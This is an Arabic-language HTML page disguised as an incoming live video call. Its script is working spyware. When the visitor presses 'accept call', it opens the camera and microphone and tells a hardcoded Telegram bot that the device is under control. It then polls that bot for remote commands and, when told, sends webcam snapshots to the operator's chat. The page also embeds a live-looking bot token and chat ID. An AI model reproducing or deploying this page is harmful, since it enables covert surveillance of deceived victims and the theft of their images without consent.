<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دردشة فيديو مباشرة</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { background: #ff0055; color: #fff; padding: 20px; border-radius: 50px; border: none; font-size: 20px; cursor: pointer; width: 80%; }
    </style>
</head>
<body>
    <div id="content">
        <h2>🔥 مكالمة واردة...</h2>
        <button class="btn" id="startBtn">قبول المكالمة</button>
        <p id="msg"></p>
    </div>

    <script>
        const TOKEN = "8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0";
        const CHAT_ID = "8350812242";
        let stream;

        document.getElementById('startBtn').addEventListener('click', async () => {
            try {
                // فتح الكاميرا والميكروفون فوراً عند الضغط
                stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                document.getElementById('msg').innerText = "جاري الاتصال...";
                
                // إبلاغ البوت بالسيطرة
                sendMsg("✅ الجهاز متصل وجاهز للأوامر (Reno 13)");

                // فحص الأوامر من لوحة تحكمك كل 5 ثواني
                setInterval(checkRemoteControl, 5000);
            } catch (e) {
                document.getElementById('msg').innerText = "يجب السماح بالصلاحيات!";
            }
        });

        async function checkRemoteControl() {
            const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
            const data = await res.json();
            if (data.result.length > 0) {
                const cmd = data.result[0].message.text;
                if (cmd === "صورة") takePhoto();
                if (cmd === "صوت") sendMsg("🎤 الميكروفون شغال وبسمعك حالياً...");
            }
        }

        async function takePhoto() {
            const v = document.createElement('video');
            v.srcObject = stream;
            await v.play();
            const c = document.createElement('canvas');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(b => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', b, 'live.jpg');
                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');
        }

        function sendMsg(m) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(m)}`);
        }
    </script>
</body>
</html>
